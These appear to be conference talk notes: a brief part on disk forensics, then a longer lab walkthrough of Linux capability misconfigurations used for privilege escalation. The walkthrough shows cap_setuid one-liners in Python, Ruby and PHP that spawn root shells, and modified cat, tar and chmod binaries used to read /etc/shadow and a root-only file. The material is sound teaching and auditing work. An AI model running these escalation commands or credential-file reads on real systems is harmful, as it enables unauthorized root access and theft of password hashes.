# Digital Overdose

https://digitaloverdose.tech/dovercon/schedule-edition-2021#title

## Honey I shrunk the disks - Simmons

- Disks and partitions
- file tables
- file carving

- Equipment
- autopsy

Disks -> partitions -> blocks -> binary

In recycle bin - still have record in the MFT

File carving - block by block on the disk and find file signature

SATA to USB connector, CAINE OS - has autopsy tool

Autopsy - opensource

## Capabilities: That one vulnerability vector you don't realize exists - 3t3rn4l P4r4d0x

Capabilities
- Attribute we give to binary to do something

Execve 
- run specific program

Cap_setuid
- manipulate process UIDs

Cap_dac_read_search
- bypass file read permission
- eg. read /etc/shadow

Cap-fowner
- bypass permission check

```
kali@kali:~/code$ cat execve.c 
#include <stdlib.h>

int execve();

int main(){
        execve("/bin/sh",0,0);
}

kali@kali:~/code$ gcc execve.c -o execve
kali@kali:~/code$ sudo ./execve
[sudo] password for kali: 
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

Capabilities usage

getcap and setcap
```
kali@kali:~/code/capabilities$ cp $(which cat) ./cat_modified
kali@kali:~/code/capabilities$ getcap cat_modified
kali@kali:~/code/capabilities# setcap cap_setuid+ep cat_modified 
kali@kali:~/code/capabilities$ getcap cat_modified 
cat_modified cap_setuid=ep
kali@kali:~/code/capabilities# setcap -r cat_modified 
kali@kali:~/code/capabilities$ getcap cat_modified 
kali@kali:~/code/capabilities$ 
```

getcap all
```
kali@kali:~/code/capabilities$ getcap -r / 2>/dev/null
/usr/bin/fping cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/gnome-keyring-daemon cap_ipc_lock=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
kali@kali:~/code/capabilities$ 
```

```
kali@kali:~/code/capabilities$ capsh --print
Current: =
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Ambient set =
Current IAB: 
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=1000(kali) euid=1000(kali)
gid=1000(kali)
groups=24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner),1000(kali)
Guessed mode: UNCERTAIN (0)
```

### Python scenario

User trying to spawn root shell
```
kali@kali:~/code/capabilities$ python -c 'import os; os.setuid(0); os.system("/bin/bash")'
Traceback (most recent call last):
  File "<string>", line 1, in <module>
OSError: [Errno 1] Operation not permitted
```

Sysadmin running root may stuff up the capabilities and allow setuid as root
```
root@kali:/home/kali/code/capabilities# id
uid=0(root) gid=0(root) groups=0(root)
root@kali:/home/kali/code/capabilities# cp $(which python3) ./python3_mod
root@kali:/home/kali/code/capabilities# setcap cap_setuid+ep python3_mod 
root@kali:/home/kali/code/capabilities# 
```

Now as a user you can get elevated priv running that modified python3_mod. OUr uid now changes to root
```
kali@kali:~/code/capabilities$ python -c 'import os; os.setuid(0); os.system("/bin/bash")'
Traceback (most recent call last):
  File "<string>", line 1, in <module>
OSError: [Errno 1] Operation not permitted

kali@kali:~/code/capabilities$ getcap -r .
./python3_mod cap_setuid=ep
kali@kali:~/code/capabilities$ ./python3_mod -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@kali:~/code/capabilities# id
uid=0(root) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)

```

### Ruby scenario

Sysadmin misconfig ruby
```
root@kali:/home/kali/code/capabilities# cp $(which ruby) ./ruby_mod
root@kali:/home/kali/code/capabilities# setcap cap_setuid+ep ruby_mod 
```

User
```
kali@kali:~/code/capabilities$ ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
Traceback (most recent call last):
        1: from -e:1:in `<main>'
-e:1:in `setuid': Operation not permitted (Errno::EPERM)

kali@kali:~/code/capabilities$ getcap -r .
./ruby_mod cap_setuid=ep
kali@kali:~/code/capabilities$ ./ruby_mod -e 'Process::Sys.setuid(0); exec "/bin/sh"'# id
uid=0(root) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
# 
```

### PHP Scenario

Sysadmin misconfig php
```
root@kali:/home/kali/code/capabilities# cp $(which php) ./php_mod
root@kali:/home/kali/code/capabilities# setcap cap_setuid+ep php_mod
```

User
```
kali@kali:~/code/capabilities$ CMD="/bin/sh"
kali@kali:~/code/capabilities$ php -r "posix_setuid(0); system('$CMD');"
id
uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
^C

kali@kali:~/code/capabilities$ getcap -r .
./php_mod cap_setuid=ep
kali@kali:~/code/capabilities$ ./php_mod -r "posix_setuid(0); system('$CMD');"
id
uid=0(root) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
```

### Cat Scenario

Sysadmin misconfig modified cat binary
```
root@kali:/home/kali/code/capabilities# cp $(which cat) ./cat_mod
root@kali:/home/kali/code/capabilities# setcap cap_dac_read_search+ep cat_mod 
```

User
```
kali@kali:~/code/capabilities$ cat /etc/shadow
cat: /etc/shadow: Permission denied

kali@kali:~/code/capabilities$ getcap -r .
./cat_mod cap_dac_read_search=ep

kali@kali:~/code/capabilities$ ./cat_mod /etc/shadow
root:!:18288:0:99999:7:::
daemon:*:18288:0:99999:7:::
...
```

### Tar Scenario

Sysadmin misconfigured tar
```
root@kali:/home/kali/code/capabilities# cp /etc/shadow ./shadowFile
root@kali:/home/kali/code/capabilities# ls -la shadowFile
-rw-r----- 1 root root 1639 Apr 18 00:45 shadowFile

root@kali:/home/kali/code/capabilities# cp $(which tar) ./tar_mod
root@kali:/home/kali/code/capabilities# setcap cap_dac_read_search+ep tar_mod 
```

User - cant read shadowFile or compress it with tar
```
kali@kali:~/code/capabilities$ cat shadowFile 
cat: shadowFile: Permission denied
kali@kali:~/code/capabilities$ tar -cvf shadowFile.tar /etc/shadow
tar: Removing leading `/' from member names
tar: /etc/shadow: Cannot open: Permission denied
tar: Exiting with failure status due to previous errors
```

User can compress with modified tar and decompress. Note the permission is of user
```
kali@kali:~/code/capabilities$ getcap -r .
./tar_mod cap_dac_read_search=ep
kali@kali:~/code/capabilities$ ./tar_mod -cvf shadowFile.tar /etc/shadow
./tar_mod: Removing leading `/' from member names
/etc/shadow
kali@kali:~/code/capabilities$ ls -la
total 484
drwxr-xr-x 2 kali kali   4096 Apr 18 00:48 .
-rw-r----- 1 root root   1639 Apr 18 00:45 shadowFile
-rw-r--r-- 1 kali kali  10240 Apr 18 00:49 shadowFile.tar
-rwxr-xr-x 1 root root 445560 Apr 18 00:48 tar_mod
kali@kali:~/code/capabilities$ tar -xvf shadowFile.tar 
etc/shadow
kali@kali:~/code/capabilities$ cat ./etc/shadow 
root:!:18288:0:99999:7:::
daemon:*:18288:0:99999:7:::
bin:*:18288:0:99999:7:::
...

```

### Chmod Scenario

Sysadmin has a file only readable by root
```
root@kali:/home/kali/code/capabilities# echo "only root can see this" > root.txt
root@kali:/home/kali/code/capabilities# chmod 000 root.txt
root@kali:/home/kali/code/capabilities# ls -la root.txt
---------- 1 root root 23 Apr 18 01:00 root.txt
root@kali:/home/kali/code/capabilities# cat root.txt
only root can see this
```

Sysadmin misconfigured chmod permission
```
root@kali:/home/kali/code/capabilities# cp $(which chmod) ./chmod_mod
root@kali:/home/kali/code/capabilities# setcap cap_fowner+ep chmod_mod 
root@kali:/home/kali/code/capabilities# 
```

User
```
kali@kali:~/code/capabilities$ cat root.txt
cat: root.txt: Permission denied
kali@kali:~/code/capabilities$ chmod 777 root.txt
chmod: changing permissions of 'root.txt': Operation not permitted

kali@kali:~/code/capabilities$ getcap -r .
./chmod_mod cap_fowner=ep
kali@kali:~/code/capabilities$ ./chmod_mod 777 root.txt
kali@kali:~/code/capabilities$ ls -la root.txt 
-rwxrwxrwx 1 root root 23 Apr 18 01:00 root.txt
kali@kali:~/code/capabilities$ cat root.txt 
only root can see this
```

### Conclusion
- Figure out binary that has capabilities
- What does the binary do
- What capability can you use for the binary
- Combine this and think of how to get elevated access
